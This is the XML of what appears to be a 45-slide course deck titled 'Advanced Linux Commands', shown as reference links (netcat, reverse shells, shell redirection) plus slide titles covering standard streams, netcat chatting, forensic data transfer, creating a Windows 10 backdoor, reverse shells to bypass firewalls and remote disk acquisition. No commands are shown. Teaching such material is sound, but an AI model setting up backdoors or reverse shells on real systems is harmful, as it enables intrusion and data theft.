              <a:rPr lang="en-US" sz="2667" dirty="0">
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>https://en.wikipedia.org/wiki/Standard_streams</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2667" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2667" dirty="0">
                <a:hlinkClick r:id="rId4"/>
              </a:rPr>
              <a:t>https://www.brianstorti.com/understanding-shell-script-idiom-redirect/</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2667" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2667" dirty="0">
                <a:hlinkClick r:id="rId5"/>
              </a:rPr>
              <a:t>https://www.computerhope.com/unix/nc.htm</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2667" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2667" dirty="0">
                <a:hlinkClick r:id="rId6"/>
              </a:rPr>
              <a:t>https://www.sans.org/security-resources/sec560/netcat_cheat_sheet_v1.pdf</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2667" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2667" dirty="0"/>
              <a:t>https://stackoverflow.com/questions/35271850/what-is-a-reverse-shell</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3782016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5416</TotalTime>
  <Words>1349</Words>
  <Application>Microsoft Office PowerPoint</Application>
  <PresentationFormat>Widescreen</PresentationFormat>
  <Paragraphs>206</Paragraphs>
  <Slides>45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 Unicode MS</vt:lpstr>
      <vt:lpstr>Arial</vt:lpstr>
      <vt:lpstr>Calibri</vt:lpstr>
      <vt:lpstr>Calibri Light</vt:lpstr>
      <vt:lpstr>OCRB</vt:lpstr>
      <vt:lpstr>Segoe Print</vt:lpstr>
      <vt:lpstr>Office Theme</vt:lpstr>
      <vt:lpstr>Advanced Linux Commands</vt:lpstr>
      <vt:lpstr>Outline</vt:lpstr>
      <vt:lpstr>Standard input/output/error devices</vt:lpstr>
      <vt:lpstr>Input and output devices are files (0,1,2)!</vt:lpstr>
      <vt:lpstr>Standard input: stdin</vt:lpstr>
      <vt:lpstr>Standard output: stdout</vt:lpstr>
      <vt:lpstr>Another example</vt:lpstr>
      <vt:lpstr>Standard error: stderr</vt:lpstr>
      <vt:lpstr>Network utilities use standard devices </vt:lpstr>
      <vt:lpstr>Chatting</vt:lpstr>
      <vt:lpstr>Forensic Data Transfer</vt:lpstr>
      <vt:lpstr>Your work</vt:lpstr>
      <vt:lpstr>Goal : Communication between two machines</vt:lpstr>
      <vt:lpstr>Goal</vt:lpstr>
      <vt:lpstr>PowerPoint Presentation</vt:lpstr>
      <vt:lpstr>PowerPoint Presentation</vt:lpstr>
      <vt:lpstr>Create a backdoor at Window 10/Remote File Acquisition</vt:lpstr>
      <vt:lpstr>Same Goal</vt:lpstr>
      <vt:lpstr>Backdoor background</vt:lpstr>
      <vt:lpstr>PowerPoint Presentation</vt:lpstr>
      <vt:lpstr>Reverse Shell</vt:lpstr>
      <vt:lpstr>Motivation</vt:lpstr>
      <vt:lpstr>How to bypass firewall?</vt:lpstr>
      <vt:lpstr>Reverse shell definition</vt:lpstr>
      <vt:lpstr>Reverse shell demo</vt:lpstr>
      <vt:lpstr>PowerPoint Presentation</vt:lpstr>
      <vt:lpstr>Remote Disk Acquisition</vt:lpstr>
      <vt:lpstr>Remote disk acquisition scenario </vt:lpstr>
      <vt:lpstr>Do you have enough disk space in Linux to save the acquired Windows image?</vt:lpstr>
      <vt:lpstr>Remote disk acquisition: Linux</vt:lpstr>
      <vt:lpstr>Remote disk acquisition: Windows partitions  </vt:lpstr>
      <vt:lpstr>Remote disk acquisition: Windows </vt:lpstr>
      <vt:lpstr>PowerPoint Presentation</vt:lpstr>
      <vt:lpstr>PowerPoint Presentation</vt:lpstr>
      <vt:lpstr>Issue: Remote disk acquisition is slow</vt:lpstr>
      <vt:lpstr>Auto speed testing (only dd in Linux)</vt:lpstr>
      <vt:lpstr>PowerPoint Presentation</vt:lpstr>
      <vt:lpstr>PowerPoint Presentation</vt:lpstr>
      <vt:lpstr>We have to manually try optimized block size</vt:lpstr>
      <vt:lpstr>Summary</vt:lpstr>
      <vt:lpstr>Summary</vt:lpstr>
      <vt:lpstr>Summary</vt:lpstr>
      <vt:lpstr>Assignment</vt:lpstr>
      <vt:lpstr>Extra credits: Another approach for reverse shell</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Xu</dc:creator>
  <cp:lastModifiedBy>Aminu Idris</cp:lastModifiedBy>
  <cp:revision>8</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2020-09-14T14:43:27Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2025-08-24T07:22:57Z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f46707a-0714-4b19-9e75-9e86a08e862d_Enabled">
    <vt:lpwstr>true</vt:lpwstr>
  </property>
  <property fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" pid="3" name="MSIP_Label_2f46707a-0714-4b19-9e75-9e86a08e862d_SetDate">
    <vt:lpwstr>2022-09-05T12:28:35Z</vt:lpwstr>
  </property>
  <property fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" pid="4" name="MSIP_Label_2f46707a-0714-4b19-9e75-9e86a08e862d_Method">
    <vt:lpwstr>Standard</vt:lpwstr>
  </property>
  <property fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" pid="5" name="MSIP_Label_2f46707a-0714-4b19-9e75-9e86a08e862d_Name">
    <vt:lpwstr>defa4170-0d19-0005-0004-bc88714345d2</vt:lpwstr>
  </property>
  <property fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" pid="6" name="MSIP_Label_2f46707a-0714-4b19-9e75-9e86a08e862d_SiteId">
    <vt:lpwstr>e902b1b3-068c-446e-83b4-e3dfa474e6f9</vt:lpwstr>
  </property>
  <property fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" pid="7" name="MSIP_Label_2f46707a-0714-4b19-9e75-9e86a08e862d_ActionId">
    <vt:lpwstr>0f084cfb-078a-4cb3-b4bd-6d0825afb445</vt:lpwstr>
  </property>
  <property fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" pid="8" name="MSIP_Label_2f46707a-0714-4b19-9e75-9e86a08e862d_ContentBits">
    <vt:lpwstr>0</vt:lpwstr>
  </property>
</Properties>
</file>